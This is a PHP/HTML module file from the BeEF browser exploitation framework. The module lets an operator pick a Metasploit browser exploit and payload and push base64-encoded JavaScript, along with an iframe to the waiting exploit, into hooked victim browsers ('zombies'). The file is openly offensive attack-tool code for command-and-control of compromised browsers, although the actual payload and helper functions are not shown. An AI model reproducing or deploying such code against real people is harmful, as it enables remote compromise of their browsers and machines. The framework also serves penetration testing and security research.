<?
	// Copyright (c) 2006, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
	
?>

<!--

BeEF: the following is the boiler plate from the exploit

-->
<script language="javascript" type="text/javascript">
	var rtnval = "OK Clicked";

	Element.Methods.construct_code = function($url) {

		// javascript is loaded from a file - it could be hard coded
		var b64code = '<? echo get_b64_file(JS_FILE); ?>';
		b64code = b64replace(b64code, "URL",$url);

		// send the code to the zombies
		do_send(b64code);
	}

	// add construct code to DOM
	Element.addMethods();
	
</script>

<!-- PAGE CONTENT -->
<div id="module_header">exploit: Metasploit Browser Attack</div>
This module creates a Metasploit listener using a backend server, and then sends the client an iframe connecting to the waiting exploit.
<div id="module_subsection">
	<form name="myform" id="myform">
		<div id="module_subsection_header">Exploit</div>
		<div id="exploits">
		If you have configured your Metasploit module, click load below.<BR>
		<input class="button" type="button" value="Load Exploits" onClick="javascript:msf_getExploitList()"/>
		</div>
		<div id="module_subsection_header">Payload</div>
		<div id="payloads">Choose Exploit First</div>
		<div id="module_subsection_header">Options</div>
		<div id="options">Choose Payload First</div>
		<input class="button" type="button" value="exploit" onClick="javascript:msf_callExploit()"/>
	</form>
</div>

